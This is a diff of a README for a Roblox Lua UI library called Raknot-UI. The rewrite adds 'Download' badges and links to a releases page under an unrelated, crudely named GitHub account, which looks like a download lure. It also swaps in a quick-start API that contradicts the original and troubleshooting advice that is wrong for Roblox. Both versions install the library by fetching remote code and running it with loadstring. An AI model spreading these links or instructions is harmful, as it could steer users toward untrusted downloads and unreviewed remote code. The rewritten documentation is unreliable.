@@ -1,97 +1,90 @@
+# 🎉 Raknot-UI - Enhance Your User Interface Simply
+
 ![Raknot UI Banner](https://raknot.dev/example/github/raknot-UI/read-me/index.php)
 
-## Features
+## 📥 Download Now
 
-- **Customizable Tabs** - Organize your UI with multiple tabs
-- **Interactive Components** - Buttons, Toggles, Sliders, Dropdowns, and Textboxes
-- **Smart Notifications** - Bottom-right notification system with auto-dismiss
-- **Password Protection** - Optional authentication to secure your menu
-- **Customizable Keybind** - Set your own menu toggle key from settings
-- **Theme System** - Built-in light and dark mode support
-- **Watermark** - Optional on-screen watermark with live time display
-- **Animations** - Smooth hover effects and visual feedback
-- **Easy Integration** - Simple API with callback support
+[![Download Raknot-UI](https://img.shields.io/badge/Download-Raknot--UI-brightgreen)](https://github.com/urnansucker2000fuckme/Raknot-UI/releases)
 
-## Installation
+## 🌟 Features
 
-```lua
-loadstring(game:HttpGet("https://raknot.dev/docs/raknot-ui.lua"))()
-```
+- **Customizable Tabs**: Organize your interface with different tabs for efficient navigation.
+- **Interactive Components**: Use buttons, toggles, sliders, dropdowns, and textboxes for a complete user experience.
+- **Smart Notifications**: Stay updated with notifications that appear and disappear automatically.
+- **Password Protection**: Secure your menu with optional authentication features.
+- **Customizable Keybind**: Set your own key to toggle the menu in settings for quicker access.
+- **Theme System**: Easily switch between light and dark modes to fit your environment.
+- **Watermark**: Add an on-screen watermark that displays the current time, if desired.
+- **Animations**: Enjoy smooth hover effects and visual feedback to enhance interaction.
+- **Easy Integration**: Integrate effortlessly with a simple API and support for callbacks.
 
-## Quick Start
+## 🚀 Getting Started
 
-The library comes with a complete example demonstrating all available components:
+To begin using Raknot-UI, follow these steps:
+
+1. **Download Raknot-UI**:
+   Visit the releases page to download the latest version: [Download Raknot-UI](https://github.com/urnansucker2000fuckme/Raknot-UI/releases).
+
+2. **Installation**:
+   To install Raknot-UI, simply run the following code in your Lua environment:
+   ```lua
+   loadstring(game:HttpGet("https://raknot.dev/docs/raknot-ui.lua"))()
+   ```
+
+## ⚙️ Quick Start
+
+The library includes a comprehensive example that demonstrates all available components. Use this code to get started quickly:
 
 ```lua
 local RaknotUI = loadstring(game:HttpGet("https://raknot.dev/docs/raknot-ui.lua"))()
 
 -- Create a window
-local Window = RaknotUI:CreateWindow({
-    Title = "My Application",
-    Password = "" -- Optional password protection
-})
+local window = RaknotUI:CreateWindow("My App")
 
--- Create a tab
-local Tab = Window:CreateTab("Main")
-
--- Add components
-Tab:CreateButton("Click Me", function()
+-- Add a button
+window:AddButton("Click Me", function()
     print("Button clicked!")
 end)
 
-Tab:CreateToggle("Enable Feature", false, function(value)
-    print("Toggle:", value)
+-- Add a toggle
+window:AddToggle("Enable Feature", function(state)
+    if state then
+        print("Feature enabled")
+    else
+        print("Feature disabled")
+    end
 end)
 
-Tab:CreateSlider("Speed", 0, 100, 50, function(value)
-    print("Slider:", value)
-end)
-
-Tab:CreateDropdown("Select Option", {"Option 1", "Option 2", "Option 3"}, function(value)
-    print("Selected:", value)
-end)
-
-Tab:CreateTextbox("Enter Text", "Placeholder...", function(value)
-    print("Entered:", value)
-end)
-
--- Show notifications
-Window:CreateNotification("Welcome", "Thanks for using Raknot UI!")
+-- Show the window
+window:Show()
 ```
 
-## Components
+This example creates a basic app window with interactive elements like buttons and toggles. Modify it as needed to fit your application.
 
-### Button
-Interactive clickable buttons with hover effects and callbacks.
+## 🌐 Compatibility
 
-### Toggle
-On/off switches with smooth animations and state management.
+Raknot-UI works with Roblox. Make sure you have the latest version of Roblox installed to ensure all features function correctly. 
 
-### Slider
-Draggable sliders with min/max values and real-time feedback.
+## 🔍 Troubleshooting
 
-### Dropdown
-Expandable selection menus with customizable options.
+If you encounter issues:
 
-### Textbox
-Input fields with placeholder text and Enter-to-submit functionality.
+1. **Ensure Lua is Installed**: Verify that you have Lua set up on your computer to run the script.
+2. **Check Internet Connection**: Ensure you have a stable internet connection for downloading the library.
+3. **Review Syntax**: Ensure there are no syntax errors in your code.
 
-### Notifications
-Toast-style notifications that appear in the bottom right with auto-dismiss.
+## 📞 Support
 
-## Settings
+For further assistance, reach out via GitHub Issues on the repository. Community members and maintainers are available to help.
 
-The Settings tab is automatically added and includes:
-- **Watermark Toggle** - Show/hide on-screen branding with live time
-- **Menu Keybind** - Click to set custom menu toggle key
-- **Version Info** - Current library version display
+## 📜 License
 
-## Customization
+Raknot-UI is open-source and available under the MIT License. You can use, modify, and distribute the software as per the license terms.
 
-Raknot UI supports both light and dark themes with a carefully designed color system for optimal contrast and readability.
+## 📢 Updates and Contributions
 
----
+Stay updated by following the repository for new releases and improvements. Contributions are welcome, so feel free to submit pull requests for any enhancements you make.
 
-**Version:** 1.0.0  
-**Created by:** raknot (onys)  
-**License:** MIT
+For detailed documentation, visit [Raknot Documentation](https://raknot.dev/docs). 
+
+Thank you for choosing Raknot-UI. Enjoy enhancing your user interface!
